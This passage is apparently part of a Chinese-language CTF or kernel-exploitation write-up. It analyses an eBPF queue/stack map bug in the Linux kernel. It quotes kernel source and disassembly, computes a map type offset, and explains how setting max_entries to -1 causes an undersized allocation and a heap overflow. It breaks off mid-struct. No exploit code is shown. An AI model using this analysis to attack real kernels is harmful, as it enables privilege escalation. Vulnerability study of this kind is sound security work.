class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_create</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> numa_node = bpf_map_attr_numa_node(attr);</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line">  <span class="keyword">int</span> f_flags;</span><br><span class="line">  <span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">  err = CHECK_ATTR(BPF_MAP_CREATE);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  f_flags = bpf_get_file_flag(attr-&gt;map_flags);</span><br><span class="line">  <span class="keyword">if</span> (f_flags &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> f_flags;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (numa_node != NUMA_NO_NODE &amp;&amp;</span><br><span class="line">      ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)numa_node &gt;= nr_node_ids ||</span><br><span class="line">       !node_online(numa_node)))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* find map type and init map: hashtable vs rbtree vs bloom vs ... */</span></span><br><span class="line">  <span class="built_in">map</span> = find_and_alloc_map(attr);</span><br><span class="line">  <span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line">    <span class="keyword">return</span> PTR_ERR(<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">  err = bpf_obj_name_cpy(<span class="built_in">map</span>-&gt;name, attr-&gt;map_name);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">goto</span> free_map_nouncharge;</span><br><span class="line"></span><br><span class="line">  atomic_set(&amp;<span class="built_in">map</span>-&gt;refcnt, <span class="number">1</span>);</span><br><span class="line">  atomic_set(&amp;<span class="built_in">map</span>-&gt;usercnt, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (attr-&gt;btf_key_type_id || attr-&gt;btf_value_type_id) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">btf</span> *<span class="title">btf</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!attr-&gt;btf_key_type_id || !attr-&gt;btf_value_type_id) &#123;</span><br><span class="line">      err = -EINVAL;</span><br><span class="line">      <span class="keyword">goto</span> free_map_nouncharge;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    btf = btf_get_by_fd(attr-&gt;btf_fd);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(btf)) &#123;</span><br><span class="line">      err = PTR_ERR(btf);</span><br><span class="line">      <span class="keyword">goto</span> free_map_nouncharge;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    err = map_check_btf(<span class="built_in">map</span>, btf, attr-&gt;btf_key_type_id,</span><br><span class="line">                        attr-&gt;btf_value_type_id);</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      btf_put(btf);</span><br><span class="line">      <span class="keyword">goto</span> free_map_nouncharge;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">map</span>-&gt;btf = btf;</span><br><span class="line">    <span class="built_in">map</span>-&gt;btf_key_type_id = attr-&gt;btf_key_type_id;</span><br><span class="line">    <span class="built_in">map</span>-&gt;btf_value_type_id = attr-&gt;btf_value_type_id;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  err = security_bpf_map_alloc(<span class="built_in">map</span>);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">goto</span> free_map_nouncharge;</span><br><span class="line"></span><br><span class="line">  err = bpf_map_init_memlock(<span class="built_in">map</span>);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">goto</span> free_map_sec;</span><br><span class="line"></span><br><span class="line">  err = bpf_map_alloc_id(<span class="built_in">map</span>);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">goto</span> free_map;</span><br><span class="line"></span><br><span class="line">  err = bpf_map_new_fd(<span class="built_in">map</span>, f_flags);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">/* failed to allocate fd.</span></span><br><span class="line"><span class="comment"> * bpf_map_put() is needed because the above</span></span><br><span class="line"><span class="comment"> * bpf_map_alloc_id() has published the map</span></span><br><span class="line"><span class="comment"> * to the userspace and the userspace may</span></span><br><span class="line"><span class="comment"> * have refcnt-ed it through BPF_MAP_GET_FD_BY_ID.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    bpf_map_put(<span class="built_in">map</span>);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  free_map:</span><br><span class="line">  bpf_map_release_memlock(<span class="built_in">map</span>);</span><br><span class="line">  free_map_sec:</span><br><span class="line">  security_bpf_map_free(<span class="built_in">map</span>);</span><br><span class="line">  free_map_nouncharge:</span><br><span class="line">  btf_put(<span class="built_in">map</span>-&gt;btf);</span><br><span class="line">  <span class="built_in">map</span>-&gt;ops-&gt;map_free(<span class="built_in">map</span>);</span><br><span class="line">  <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面分析find_and_alloc_map函数，那么首先还是先看一下传参结构体的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/* anonymous struct used by BPF_MAP_CREATE command */</span></span><br><span class="line">__u32map_type;<span class="comment">/* one of enum bpf_map_type */</span></span><br><span class="line">__u32key_size;<span class="comment">/* size of key in bytes */</span></span><br><span class="line">__u32value_size;<span class="comment">/* size of value in bytes */</span></span><br><span class="line">__u32max_entries;<span class="comment">/* max number of entries in a map */</span></span><br><span class="line">__u32map_flags;<span class="comment">/* BPF_MAP_CREATE related</span></span><br><span class="line"><span class="comment"> * flags defined above.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">__u32inner_map_fd;<span class="comment">/* fd pointing to the inner map */</span></span><br><span class="line">__u32numa_node;<span class="comment">/* numa node (effective only if</span></span><br><span class="line"><span class="comment"> * BPF_F_NUMA_NODE is set).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">char</span>map_name[BPF_OBJ_NAME_LEN];</span><br><span class="line">__u32map_ifindex;<span class="comment">/* ifindex of netdev to create on */</span></span><br><span class="line">__u32btf_fd;<span class="comment">/* fd pointing to a BTF type data */</span></span><br><span class="line">__u32btf_key_type_id;<span class="comment">/* BTF type_id of the key */</span></span><br><span class="line">__u32btf_value_type_id;<span class="comment">/* BTF type_id of the value */</span></span><br><span class="line">&#125;;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct bpf_map *<span class="title">find_and_alloc_map</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line">u32 type = attr-&gt;map_type;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (type &gt;= ARRAY_SIZE(bpf_map_types))</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line">type = array_index_nospec(type, ARRAY_SIZE(bpf_map_types));</span><br><span class="line">ops = bpf_map_types[type];</span><br><span class="line"><span class="keyword">if</span> (!ops)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ops-&gt;map_alloc_check) &#123;</span><br><span class="line">err = ops-&gt;map_alloc_check(attr);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (attr-&gt;map_ifindex)</span><br><span class="line">ops = &amp;bpf_map_offload_ops;</span><br><span class="line"><span class="built_in">map</span> = ops-&gt;map_alloc(attr);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">map</span>;</span><br><span class="line"><span class="built_in">map</span>-&gt;ops = ops;</span><br><span class="line"><span class="built_in">map</span>-&gt;map_type = type;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里是首先根据type作为索引得到ops，最后再调用ops中的map_alloc函数但是可以注意到的是在数组中存在以下的ops结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> <span class="title">queue_map_ops</span> =</span> &#123;</span><br><span class="line">.map_alloc_check = queue_stack_map_alloc_check,</span><br><span class="line">.map_alloc = queue_stack_map_alloc,</span><br><span class="line">.map_free = queue_stack_map_free,</span><br><span class="line">.map_lookup_elem = queue_stack_map_lookup_elem,</span><br><span class="line">.map_update_elem = queue_stack_map_update_elem,</span><br><span class="line">.map_delete_elem = queue_stack_map_delete_elem,</span><br><span class="line">.map_push_elem = queue_stack_map_push_elem,</span><br><span class="line">.map_pop_elem = queue_map_pop_elem,</span><br><span class="line">.map_peek_elem = queue_map_peek_elem,</span><br><span class="line">.map_get_next_key = queue_stack_map_get_next_key,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里的漏洞也就存在于上述结构体中的<code>queue_stack_map_alloc</code>函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.text:FFFFFFFF8119D17A 44 89 F0                      mov     eax, r14d</span><br><span class="line">.text:FFFFFFFF8119D17D 4C 8B 3C C5 80 83 02 82       mov     r15, ds:qword_FFFFFFFF82028380[rax*8]</span><br><span class="line">  </span><br><span class="line">.rodata:FFFFFFFF82028380 qword_FFFFFFFF82028380   dq 0                    ; DATA XREF: map_create+AD↑r</span><br><span class="line">; ... ...</span><br><span class="line">.rodata:FFFFFFFF82028410                 dq offset unk_FFFFFFFF8210F0A0</span><br><span class="line">.rodata:FFFFFFFF82028418                 dq offset unk_FFFFFFFF82029B00</span><br><span class="line">.rodata:FFFFFFFF82028420                 dq offset unk_FFFFFFFF8202A680</span><br><span class="line">.rodata:FFFFFFFF82028428                 dq offset unk_FFFFFFFF82029B00</span><br><span class="line">.rodata:FFFFFFFF82028430                 dq offset unk_FFFFFFFF82029C40</span><br><span class="line">.rodata:FFFFFFFF82028438                 dq offset off_FFFFFFFF82029BA0</span><br><span class="line">; ... ...</span><br><span class="line">.rodata:FFFFFFFF82029BA0                 dq offset queue_stack_map_alloc_check</span><br><span class="line">.rodata:FFFFFFFF82029BA8                 dq offset queue_stack_map_alloc</span><br><span class="line">.rodata:FFFFFFFF82029BB0                 dq 0</span><br><span class="line">.rodata:FFFFFFFF82029BB8                 dq offset queue_stack_map_free</span><br><span class="line">.rodata:FFFFFFFF82029BC0                 dq offset queue_stack_map_get_next_key</span><br><span class="line">.rodata:FFFFFFFF82029BC8                 dq 0</span><br><span class="line">.rodata:FFFFFFFF82029BD0                 dq offset queue_stack_map_lookup_elem</span><br><span class="line">.rodata:FFFFFFFF82029BD8                 dq offset queue_stack_map_update_elem</span><br><span class="line">.rodata:FFFFFFFF82029BE0                 dq offset queue_stack_map_delete_elem</span><br><span class="line">.rodata:FFFFFFFF82029BE8                 dq offset queue_stack_map_push_elem</span><br><span class="line">.rodata:FFFFFFFF82029BF0                 dq offset stack_map_pop_elem</span><br><span class="line">.rodata:FFFFFFFF82029BF8                 dq offset stack_map_peek_elem</span><br></pre></td></tr></table></figure><p>可以看到只要计算偏移就可以成功修改ops为<code>queue_stack_map_alloc</code>函数，经过计算可得type为:<code>(0xFFFFFFFF82028438 - 0xFFFFFFFF82028380）/8 = 0x17 </code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct bpf_map *<span class="title">queue_stack_map_alloc</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret, numa_node = bpf_map_attr_numa_node(attr);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> *<span class="title">qs</span>;</span></span><br><span class="line">u64 size, queue_size, cost;</span><br><span class="line"></span><br><span class="line">size = (u64) attr-&gt;max_entries + <span class="number">1</span>;</span><br><span class="line">cost = queue_size = <span class="keyword">sizeof</span>(*qs) + size * attr-&gt;value_size;</span><br><span class="line"><span class="keyword">if</span> (cost &gt;= U32_MAX - PAGE_SIZE)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-E2BIG);</span><br><span class="line"></span><br><span class="line">cost = round_up(cost, PAGE_SIZE) &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">ret = bpf_map_precharge_memlock(cost);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(ret);</span><br><span class="line"></span><br><span class="line">qs = bpf_map_area_alloc(queue_size, numa_node);</span><br><span class="line"><span class="keyword">if</span> (!qs)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(qs, <span class="number">0</span>, <span class="keyword">sizeof</span>(*qs));</span><br><span class="line"></span><br><span class="line">bpf_map_init_from_attr(&amp;qs-&gt;<span class="built_in">map</span>, attr);</span><br><span class="line"></span><br><span class="line">qs-&gt;<span class="built_in">map</span>.pages = cost;</span><br><span class="line">qs-&gt;size = size;</span><br><span class="line"></span><br><span class="line">raw_spin_lock_init(&amp;qs-&gt;lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &amp;qs-&gt;<span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里的cost其实就是等于<code>sizeof(*qs) + (attr-&gt;value_size) * (attr-&gt;max_entries+1)</code>，并且这里的attr是我们可控的，如果我们控制<code>attr-&gt;max_entries</code>为-1那么这里申请的大小只有<code>sizeof(struct bpf_queue_stack)</code>并且这个size其实是管理堆块的大小，用于存储数据结构，后面的内容为数据存储结构。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bpf_map_init_from_attr</span><span class="params">(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">map</span>-&gt;map_type = attr-&gt;map_type;</span><br><span class="line"><span class="built_in">map</span>-&gt;key_size = attr-&gt;key_size;</span><br><span class="line"><span class="built_in">map</span>-&gt;value_size = attr-&gt;value_size;</span><br><span class="line"><span class="built_in">map</span>-&gt;max_entries = attr-&gt;max_entries;</span><br><span class="line"><span class="built_in">map</span>-&gt;map_flags = attr-&gt;map_flags;</span><br><span class="line"><span class="built_in">map</span>-&gt;numa_node = bpf_map_attr_numa_node(attr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后将用户传进来的attr赋值过去。最后生成id，并将id返回给用户。</p><h3 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h3><p>可以看到在上面的系统调用中存在BPF_MAP_UPDATE_ELEM功能，其实现的函数为：map_update_elem</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_update_elem</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> __user *ukey = u64_to_user_ptr(attr-&gt;key);</span><br><span class="line">  <span class="keyword">void</span> __user *uvalue = u64_to_user_ptr(attr-&gt;value);</span><br><span class="line">  <span class="keyword">int</span> ufd = attr-&gt;map_fd;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line">  <span class="keyword">void</span> *key, *value;</span><br><span class="line">  u32 value_size;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line">  <span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (CHECK_ATTR(BPF_MAP_UPDATE_ELEM))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  f = fdget(ufd);</span><br><span class="line">  <span class="built_in">map</span> = __bpf_map_get(f);</span><br><span class="line">  <span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line">    <span class="keyword">return</span> PTR_ERR(<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!(f.file-&gt;f_mode &amp; FMODE_CAN_WRITE)) &#123;</span><br><span class="line">    err = -EPERM;</span><br><span class="line">    <span class="keyword">goto</span> err_put;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  key = __bpf_copy_key(ukey, <span class="built_in">map</span>-&gt;key_size);</span><br><span class="line">  <span class="keyword">if</span> (IS_ERR(key)) &#123;</span><br><span class="line">    err = PTR_ERR(key);</span><br><span class="line">    <span class="keyword">goto</span> err_put;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_HASH ||</span><br><span class="line">      <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_LRU_PERCPU_HASH ||</span><br><span class="line">      <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_ARRAY ||</span><br><span class="line">      <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE)</span><br><span class="line">    value_size = round_up(<span class="built_in">map</span>-&gt;value_size, <span class="number">8</span>) * num_possible_cpus();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    value_size = <span class="built_in">map</span>-&gt;value_size;</span><br><span class="line"></span><br><span class="line">  err = -ENOMEM;</span><br><span class="line">  value = kmalloc(value_size, GFP_USER | __GFP_NOWARN);</span><br><span class="line">  <span class="keyword">if</span> (!value)</span><br><span class="line">    <span class="keyword">goto</span> free_key;</span><br><span class="line"></span><br><span class="line">  err = -EFAULT;</span><br><span class="line">  <span class="keyword">if</span> (copy_from_user(value, uvalue, value_size) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> free_value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Need to create a kthread, thus must support schedule */</span></span><br><span class="line">  <span class="keyword">if</span> (bpf_map_is_dev_bound(<span class="built_in">map</span>)) &#123;</span><br><span class="line">    err = bpf_map_offload_update_elem(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line">    <span class="keyword">goto</span> out;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_CPUMAP ||</span><br><span class="line">             <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_SOCKHASH ||</span><br><span class="line">             <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_SOCKMAP) &#123;</span><br><span class="line">    err = <span class="built_in">map</span>-&gt;ops-&gt;map_update_elem(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line">    <span class="keyword">goto</span> out;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里是直接取出map中存储的value_size直接kmalloc一个堆块，然后从用户态copy内容到堆块上面。随后调用ops中的map_update_elem函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">queue_stack_map_push_elem</span><span class="params">(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *value,</span></span></span><br><span class="line"><span class="params"><span class="function">                                     u64 flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> *<span class="title">qs</span> =</span> bpf_queue_stack(<span class="built_in">map</span>);</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> irq_flags;</span><br><span class="line">  <span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">void</span> *dst;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* BPF_EXIST is used to force making room for a new element in case the</span></span><br><span class="line"><span class="comment"> * map is full</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  <span class="keyword">bool</span> replace = (flags &amp; BPF_EXIST);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check supported flags for queue and stack maps */</span></span><br><span class="line">  <span class="keyword">if</span> (flags &amp; BPF_NOEXIST || flags &gt; BPF_EXIST)</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  raw_spin_lock_irqsave(&amp;qs-&gt;lock, irq_flags);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (queue_stack_map_is_full(qs)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!replace) &#123;</span><br><span class="line">      err = -E2BIG;</span><br><span class="line">      <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* advance tail pointer to overwrite oldest element */</span></span><br><span class="line">    <span class="keyword">if</span> (unlikely(++qs-&gt;tail &gt;= qs-&gt;size))</span><br><span class="line">      qs-&gt;tail = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  dst = &amp;qs-&gt;elements[qs-&gt;head * qs-&gt;<span class="built_in">map</span>.value_size];</span><br><span class="line">  <span class="built_in">memcpy</span>(dst, value, qs-&gt;<span class="built_in">map</span>.value_size);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (unlikely(++qs-&gt;head &gt;= qs-&gt;size))</span><br><span class="line">    qs-&gt;head = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  out:</span><br><span class="line">  raw_spin_unlock_irqrestore(&amp;qs-&gt;lock, irq_flags);</span><br><span class="line">  <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> <span class="title">map</span>;</span></span><br><span class="line"><span class="keyword">raw_spinlock_t</span> lock;</span><br><span class="line">u32 head, tail;</span><br><span class="line">u32 size; <span class="comment">/* max_entries + 1 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> elements[<span class="number">0</span>] __aligned(<span class="number">8</span>);</span><br><span 